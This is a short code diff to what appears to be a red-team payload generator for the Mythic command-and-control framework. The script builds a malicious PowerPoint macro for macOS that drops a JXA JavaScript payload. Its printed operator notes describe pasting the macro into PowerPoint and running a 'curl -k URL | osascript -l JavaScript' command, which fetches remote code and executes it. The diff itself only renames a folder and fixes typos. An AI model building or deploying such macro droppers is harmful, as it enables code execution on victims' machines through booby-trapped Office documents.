@@ -8,8 +8,8 @@ from Settings.MythicSettings import *
 
 
 def macro_powerpoint():
-    payload = "./Payloads/MacroPowerPoint"
-    #url = mythic_payload_url + "/PowerPoint_Macro.js"   # Used for where the JXA paylaod is hosted
+    payload = "./Payloads/MacroPowerPoint_Macro"
+    #url = mythic_payload_url + "/PowerPoint_Macro.js"   # Used for where the JXA payload is hosted
 
     os.mkdir(payload,0o775)
 
@@ -70,7 +70,7 @@ def macro_powerpoint():
         macrofile.write("End Sub")
 
         print("Note: \n"
-              "1) Copy the macro from Payloads/MacroPowerPoint_Payload/macro.txt to past into Powerpoint \n"
+              "1) Copy the macro from Payloads/MacroPowerPoint_Payload/macro.txt to paste into Powerpoint \n"
               "2) When the macro is executed it will save to ~/Library/Containers/com.microsoft.Powerpoint/Data/powerpoint.js\n"
               "3) You could replace command with 'curl -k 'URL' | osascript -l JavaScript &' to avoid disk writes but in testing this hangs the application")
  
